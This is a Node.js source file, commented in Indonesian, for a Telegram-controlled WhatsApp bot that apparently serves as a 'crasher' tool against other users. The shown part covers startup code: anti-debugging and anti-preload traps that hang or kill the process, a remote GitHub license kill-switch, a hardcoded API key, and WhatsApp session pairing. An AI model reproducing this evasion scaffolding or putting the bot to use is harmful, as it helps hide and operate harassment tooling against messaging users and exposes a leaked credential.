///CREDIT BASE BY AMBALABU
/// NO HAPUS CREDIT
'use strict';

// ─── Capture genuine exit, sekali, paling awal ────────────────────────────────
// Semua blok di bawah WAJIB pakai _hardExit ini, jangan panggil process.exit langsung,
// supaya tidak ada referensi tercecer yang bisa di-mock terpisah.
const _hardExit = Object.freeze(process.exit.bind(process));

// ─── Anti-Preload ─────────────────────────────────────────────────────────────
// HARUS jalan PERTAMA, sebelum require apapun.
// Tujuan: blok --require, --loader, --inspect, dan non-npm-start.
;(function _antiPreload() {
    // Flag Node.js yang dilarang
    const _banned = [
        '--require', '-r',
        '--loader', '--experimental-loader', '--import',
        '--inspect', '--inspect-brk', '--inspect-port',
        '--experimental-vm-modules', '--expose-internals'
    ];
    for (const arg of process.execArgv) {
        const low = arg.toLowerCase();
        for (const b of _banned) {
            if (low === b || low.startsWith(b + '=') || low.startsWith(b + ' ')) {
                _hardExit(1); for (;;) {}
            }
        }
    }

    // Block NODE_OPTIONS yang mengandung preload / inspect
    const _no = (process.env.NODE_OPTIONS || '').toLowerCase();
    if (_no.includes('--require') || _no.includes('-r ') ||
        _no.includes('--loader')  || _no.includes('--inspect') ||
        _no.includes('--import')) {
        try { delete process.env.NODE_OPTIONS; } catch (_) {}
        _hardExit(1); for (;;) {}
    }

    // Hanya boleh jalan via npm start
    const _ev     = process.env.npm_lifecycle_event;
    const _script = process.env.npm_lifecycle_script;
    const _pkg    = process.env.npm_package_name;
    if (_ev !== 'start' || !_script || !_pkg) { _hardExit(1); for (;;) {} }
})();

// ─── HTTPS Snapshot ───────────────────────────────────────────────────────────
// Langsung setelah require — tangkap referensi asli sebelum kode lain bisa override.
// _httpsGet ini dipakai oleh fetchValidTokens() untuk request ke database lisensi,
// supaya request kritis tidak lewat axios yang bisa di-monkey-patch terpisah.
const _httpsGet = (function _snapshotHttps() {
    const https = require('https');

    // Verifikasi https adalah built-in Node, bukan override dari file
    try {
        if (require.resolve('https') !== 'https') { _hardExit(1); for (;;) {} }
    } catch { _hardExit(1); for (;;) {} }

    // Properti kritis harus ada
    if (typeof https.get     !== 'function' ||
        typeof https.request !== 'function' ||
        typeof https.globalAgent === 'undefined') { _hardExit(1); for (;;) {} }

    // Verifikasi tidak ada Proxy wrapper (tanda mock/intercept)
    const sig = Function.prototype.toString.call(https.get);
    if (sig.includes('Proxy') || sig.includes('() => ') || sig.includes('resolve(')) { _hardExit(1); for (;;) {} }

    // Freeze referensi — tidak bisa di-replace setelah ini
    return Object.freeze(https.get.bind(https));
})();

// ─── Anti-Debugger ───────────────────────────────────────────────────────────
;(function _antiDbg() {
    setInterval(() => {
        const t = performance.now();
        debugger;
        if (performance.now() - t > 150) { _hardExit(9); for (;;) {} }
    }, 3000);
})();

// ─── Lock process.exit ───────────────────────────────────────────────────────
;(function _lockExit() {
    try {
        Object.defineProperty(process, 'exit', {
            value: _hardExit, writable: false, configurable: false, enumerable: true
        });
    } catch (_) {}
    setInterval(() => {
        try {
            const s = process.exit.toString();
            if (s.includes('Proxy') || s.includes('function () {}') || s.includes('return;')) {
                _hardExit(1); for (;;) {}
            }
        } catch (_) { _hardExit(1); for (;;) {} }
    }, 3000);
})();

const { Telegraf, Markup, session } = require("telegraf");
const JavaScriptObfuscator = require("javascript-obfuscator");
const fs = require("fs");
const vm = require("vm");
const os = require("os");
const chalk = require("chalk");
const REMOVE_BG_KEY = "3xj8BCNe5dWNejWDvqXWtgRK";
const readline = require("readline");
const path = require("path");
const ms = require("ms");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessageContent,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const axios = require("axios");
const FormData = require("form-data");
const { TOKEN_GINXJAL } = require("./config");
const BOT_TOKEN = TOKEN_GINXJAL;

const MODE_FILE = "./Tools/mode.json";
const crypto = require("crypto");

const premiumFile = "./database/premiumuser.json";
const adminFile = "./database/adminuser.json";
const ownerFile = "./database/owneruser.json";
const GROUP_FILE = "./Tools/groupmode.json";
const CMD_FILE = "./Tools/cmdmode.json";
const antiFotoFile = "./Tools/antifoto.json"
const safeFile = "./Tools/safeGroups.json";
const antiVideoFile = "./Tools/antivideo.json"
const premiumGroupsFile = "./Tools/premiumGroups.json";

const TOKENS_FILE = "./tokens.json";

const startTime = Date.now();
const mediaMode = new Map(); 
const userCooldown = new Map();
const verifiedUsers = new Set();
const userState = {};
const liveIntervals = {};

const sessionPath = "./session";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

global.pairingMessage = null;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let isStarting = false;
let senderUsers = [];
let hasConnectedOnce = false;
let reconnectAttempts = 0;
let waConnected = false;

const maxReconnect = 10;
const usePairingCode = true;

/////// ////////////////
function getGroupMode() {
  try {

    if (!fs.existsSync(".mode")) {
      fs.mkdirSync(".mode")
    }

    if (!fs.existsSync(GROUP_FILE)) {
      fs.writeFileSync(
        GROUP_FILE,
        JSON.stringify({ group: "off" }, null, 2)
      )
      return "off"
    }

    const data = JSON.parse(fs.readFileSync(GROUP_FILE))
    return data.group || "off"

  } catch (err) {
    console.log("❌ Gagal membaca group mode:", err)
    return "off"
  }
}
//////////////////////////////////////
function setGroupMode(group) {
  if (!["on", "off"].includes(group)) return

  const data = { group }

  fs.writeFileSync(GROUP_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Group mode diset ke: ${group}`)
}
//////////////////////////////////////
const VALID_MODES = ["self", "public"]

function getMode() {
  try {
    if (!fs.existsSync(MODE_FILE)) {
      fs.writeFileSync(MODE_FILE, JSON.stringify({ mode: "self" }, null, 2))
      return "self"
    }

    const data = JSON.parse(fs.readFileSync(MODE_FILE))
    return data.mode || "self"

  } catch (err) {
    console.log("❌ Gagal membaca mode:", err)
    return "self"
  }
}
//////////////////////////////////////
function setMode(mode) {
  if (!VALID_MODES.includes(mode)) return

  const data = { mode }

  currentMode = mode
  fs.writeFileSync(MODE_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Mode bot diset ke: ${mode}`)
}

let currentMode = getMode()
//////////////
const spamLimit = new Map()
const SPAM_WINDOW = 5000
const SPAM_MAX = 4

function antiSpam(ctx) {
  if (!ctx.from?.id) return true

  const userId = ctx.from.id
  const now = Date.now()

  if (!spamLimit.has(userId)) {
    spamLimit.set(userId, [])
  }

  let timestamps = spamLimit.get(userId).filter(t => now - t < SPAM_WINDOW)

  timestamps.push(now)
  spamLimit.set(userId, timestamps)

  if (timestamps.length > SPAM_MAX) {
    return ctx.reply("🚫 Spam terdeteksi!")
  }

  setTimeout(() => spamLimit.delete(userId), SPAM_WINDOW + 1000)

  return true
}
/// ------- ///
function isCooldown(userId, delay = 1500) {
  const now = Date.now();

  if (userCooldown.has(userId)) {
    const last = userCooldown.get(userId);

    if (now - last < delay) {
      return true;
    }
  }

  userCooldown.set(userId, now);
  return false;
}
///// ---- ( DATE ) ---- /////
function getCurrentDate() {
  return new Date().toLocaleDateString("id-ID", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  });
}

///// ---- ( RUNTIME & MEMORY ) ---- /////
function getRuntime() {
  const now = Date.now();
  const diff = now - startTime;

  const seconds = Math.floor(diff / 1000) % 60;
  const minutes = Math.floor(diff / (1000 * 60)) % 60;
  const hours = Math.floor(diff / (1000 * 60 * 60)) % 24;
  const days = Math.floor(diff / (1000 * 60 * 60 * 24));

  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}
/// ---------- GITHUB ------------ ///
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/seanfutsalmin-beep/Seannn/refs/heads/main/token.json";

// (JANGAN DIUBAH)
const INTEGRITY_SECRET = "ATOMIC_R9X_ULTRA_SECRET_" + "SHIELD".repeat(100);

axios.defaults.headers.common = {
  "User-Agent": "Atomic-Crashers-Secure-Client/17.00",
  "X-Atomic-Protection": crypto.createHash("sha256").update(INTEGRITY_SECRET).digest("hex"),
  "Cache-Control": "no-cache, no-store, must-revalidate",
  "Pragma": "no-cache",
  "Expires": "0"
};

axios.defaults.timeout = 10000;
axios.defaults.maxRedirects = 0;


Object.freeze(axios.defaults.headers.common);
Object.freeze(axios.defaults);

const TOKEN_LIST_MAX_BYTES = 5 * 1024 * 1024; // batas wajar untuk token.json, cegah body bomb

function fetchValidTokens() {
  return new Promise(resolve => {
    let settled = false;
    const done = value => {
      if (settled) return;
      settled = true;
      resolve(value);
    };
    const fail = () => {
      console.log(chalk.red("❌ Gagal mengambil token: Koneksi terputus atau data tidak sah"));
      done([]);
    };

    let req;
    try {
      req = _httpsGet(GITHUB_TOKEN_LIST_URL, {
        timeout: 10000,
        headers: {
          "User-Agent": "Atomic-Crashers-Secure-Client/17.00",
          "X-Atomic-Protection": crypto.createHash("sha256").update(INTEGRITY_SECRET).digest("hex"),
          "Cache-Control": "no-cache, no-store, must-revalidate",
          "Pragma": "no-cache",
          "Expires": "0"
        }
      }, res => {
        if (res.statusCode !== 200) {
          res.resume();
          return fail();
        }

        let body = "";
        let bytes = 0;
        res.setEncoding("utf8");
        res.on("data", chunk => {
          bytes += Buffer.byteLength(chunk);
          if (bytes > TOKEN_LIST_MAX_BYTES) {
            req.destroy();
            return fail();
          }
          body += chunk;
        });
        res.on("end", () => {
          try {
            if (!body || body.length < 10) {
              throw new Error("Data rusak atau dimanipulasi");
            }
            const data = JSON.parse(body);
            done(Array.isArray(data.tokens) ? data.tokens : []);
          } catch (_) {
            fail();
          }
        });
        res.on("error", fail);
      });
    } catch (_) {
      return fail();
    }

    req.on("timeout", () => { req.destroy(); fail(); });
    req.on("error", fail);
  });
}

// token.json di GitHub sekarang isinya double-hash (sha256 lalu md5), bukan token mentah.
// Harus persis sama dengan hashToken() di db.js (sisi yang nulis token.json).
function hashToken(token) {
  const sha = crypto.createHash("sha256").update(String(token || "")).digest("hex");
  return crypto.createHash("md5").update(sha).digest("hex");
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa keaslian token..."));


  const validHashes = await fetchValidTokens();

  if (!validHashes.length) {
    console.log(chalk.red(`
❌ DATABASE TOKEN TIDAK DAPAT DIAKSES / KOSONG
    `));
    freezeProcess();
  } else {
    const botTokenHash = hashToken(BOT_TOKEN);
    const isTokenValid = validHashes.includes(botTokenHash);

    if (!isTokenValid) {
      console.log(chalk.red("❌ TOKEN TIDAK TERDAFTAR ATAU SUDAH DICABUT AKSES"));
      freezeProcess();
    } else {
      console.log(chalk.green("✅ Token terverifikasi • Keamanan aktif"));

      setInterval(async () => {
        const freshHashes = await fetchValidTokens();
        const stillValid = freshHashes.includes(botTokenHash);
        if (!stillValid) {
          console.log(chalk.red("⚠️ TOKEN SUDAH TIDAK SAH • MEMATIKAN SISTEM"));
          freezeProcess();
        }
      }, 30000);

      startBot();
    }
  }
}

function freezeProcess() {
  for (;;);
}

function startBot() {
  console.log(chalk.cyan(`⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

» Information:
☇ Creator : @seanoffc
☇ Name Script : Zalindra invlasion
☇ Version : 16.0.0
  
Bot Berhasil Terhubung • Gunakan Script Sebrutal Mungkin`));
}

validateToken();

/// ------ Start WhatsApp Session ------ ///
const startSesi = async () => {
  try {
    if (isStarting) return;
    isStarting = true;

    console.log(chalk.blue(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠖⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⢤⡀⠀⠀⠀⠀⢸⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡀⠈⠢⡀⠀⠀⢀⠀⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⡔⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠊⡹⠀⠀⠘⢄⠀⠈⠲⢖⠈⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠈⠢⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠁⢠⠞⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠉⠑⠢⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡠⠚⠁⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⠇⠀⡤⡀⠀⠀⠀⢀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢠⣾⣿⣷⣶⣤⣄⣉⠑⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠞⢁⣴⣾⣿⣿⡆⢇⠀⠀⠀⠀⠀⠸⡀⠀⠂⠿⢦⡰⠀⠀⠋⡄⠀⠀⠀⠀⠀⠀⠀⢰⠁⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⢆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡴⢁⣴⣿⣿⣿⣿⣿⣿⡘⡄⠀⠀⠀⠀⠀⠱⣔⠤⡀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⡜⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⢣⠀⠀⠀⠀⠀
⠀⠀⡼⢠⣾⣿⣿⣿⣿⣿⣿⣿⣧⡘⢆⠀⠀⠀⠀⠀⢃⠑⢌⣦⠀⠩⠉⠀⡜⠀⠀⠀⠀⠀⠀⢠⠃⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣣⡀⠀⠀⠀
⠀⠀⢰⢃⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠱⡀⠀⠀⠀⢸⠀⠀⠓⠭⡭⠙⠋⠀⠀⠀⠀⠀⠀⠀⡜⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡱⡄⠀⠀
⠀⠀⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢃⠀⠀⠀⢸⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⢀⠜⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠘⣆⠀
⠀⢸⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡘⣆⠀⠀⡆⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⡠⠖⣡⣾⠁⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢸⠀
⠀⡏⣾⣿⣿⣿⣿⡿⡛⢟⢿⣿⣿⣿⣿⣿⣿⣧⡈⢦⣠⠃⠀⠀⠀⠀⠀⢱⣀⠤⠒⢉⣾⡉⠻⠋⠈⢘⢿⣿⣿⣿⣿⠿⣿⣿⠏⠉⠻⢿⣿⣿⣿⣿⡘⡆
⢰⡇⣿⣿⠟⠁⢸⣠⠂⡄⣃⠜⣿⣿⠿⠿⣿⣿⡿⠦⡎⠀⠀⠀⠀⠀⠒⠉⠉⠑⣴⣿⣿⣎⠁⠠⠂⠮⢔⣿⡿⠉⠁⠀⠹⡛⢀⣀⡠⠀⠙⢿⣿⣿⡇⡇
⠘⡇⠏⠀⠀⠀⡾⠤⡀⠑⠒⠈⠣⣀⣀⡀⠤⠋⢀⡜⣀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠙⢿⡟⠉⡃⠈⢀⠴⣿⣿⣀⡀⠀⠀⠀⠈⡈⠊⠀⠀⠀⠀⠙⢿⡇⡇
⠀⠿⠀⠀⠀⠀⠈⠀⠉⠙⠓⢤⣀⠀⠁⣀⡠⢔⡿⠊⠀⠀⠀⠀⠙⢦⡀⠀⠐⠢⢄⡀⠁⡲⠃⠀⡜⠀⠹⠟⠻⣿⣰⡐⣄⠎⠀⠀⠀⠀⠀⠀⠀⠀⢣⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⠀⠙⢦⣀⢀⡴⠁⠀⠀⠀⠀⠉⠁⢱⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠈⢏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠈⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⢀⡴⠁⠀⠀⢀⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠘⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⣧⣠⠤⠤⠋⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠀⠀⠳⢄⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠊⠈⠁⠀⠀⠀⡔⠛⠲⣤⣀⣀⣀⠀⠈⢣⡀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⢀⡠⢔⠝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢈⠤⠒⣀⠀⠀⠀⠀⣀⠟⠀⠀⠀⠑⠢⢄⡀⠀⠀⠈⡗⠂⠀⠀⠀⠙⢦⠤⠒⢊⡡⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠒⣒⡁⠬⠦⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠒⢺⢠⠤⡀⢀⠤⡀⠠⠷⡊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠣⡀⡱⠧⡀⢰⠓⠤⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠈⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @seanoffc
☇ Name Script : Zalindra invlasion
☇ Version : 16.0.0
☇ Bot Connect
`));

    if (sock?.ev) {
      sock.ev.removeAllListeners("connection.update");
      sock.ev.removeAllListeners("creds.update");
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      keepAliveIntervalMs: 25000,
      connectTimeoutMs: 60000,
      markOnlineOnConnect: true,
      emitOwnEvents: true,
      fireInitQueries: true
    });

    sock.ev.on("creds.update", saveCreds);

    //console.log("🔐 Siap pairing / reconnect...");

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      const reason = lastDisconnect?.error?.output?.statusCode;

      if (connection === "connecting") {
        //console.log("🔄 Connecting...");
      }

      if (connection === "open") {
        isWhatsAppConnected = true;
        isStarting = false;
        hasConnectedOnce = true;
        reconnectAttempts = 0;

        linkedWhatsAppNumber = sock.user?.id?.split(":")[0];

        console.log(`
⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
» Information:
☇ Creator : @seanoffc
☇ Name Script : Zalindra invlasion
☇ Version : 16.0.0
☇ Bot Connect
☇ WhatsApp Number : ${linkedWhatsAppNumber}
`);
       
        if (global.pairingMessage?.chatId && global.pairingMessage?.messageId) {
          try {

            await bot.telegram.editMessageCaption(
              global.pairingMessage.chatId,
              global.pairingMessage.messageId,
              undefined,
`<pre>⬡═―⊱「 𝚣𝚊𝚕𝚒𝚗𝚍𝚛𝚊 」⊰―═⬡
       
  ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
ϟ    Number : ${linkedWhatsAppNumber}
ϟ    Status : Connected
</pre>`,
              { parse_mode: "HTML" }
            );

          } catch (err) {
            console.log("❌ Gagal edit pesan:", err.message);
          }

          global.pairingMessage = null;
        }
      }

      if (connection === "close") {
        isWhatsAppConnected = false;
        isStarting = false;

        console.log("❌ Disconnected:", reason);

        if (reason === DisconnectReason.loggedOut || reason === 401) {
          //console.log("🚫 Session logout / invalid");

          deleteSession();
          global.pairingMessage = null;
          reconnectAttempts = 0;
          return;
        }

        reconnectAttempts++;

        if (reconnectAttempts > maxReconnect) {
          //console.log("⛔ Stop reconnect (limit)");
          return;
        }

        const delay = Math.min(5000 * reconnectAttempts, 30000);

        console.log(`♻️ Reconnect dalam ${delay / 1000}s`);

        setTimeout(() => startSesi(), delay);
      }
    });

  } catch (err) {
    console.log("❌ Error start session:", err);
    isStarting = false;
  }
};
///////////////////////////////////////////////////
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    return ctx.reply("❌ WhatsApp belum connect, /connect dulu");
  }
  return next();
};

//////////////////////////////////////
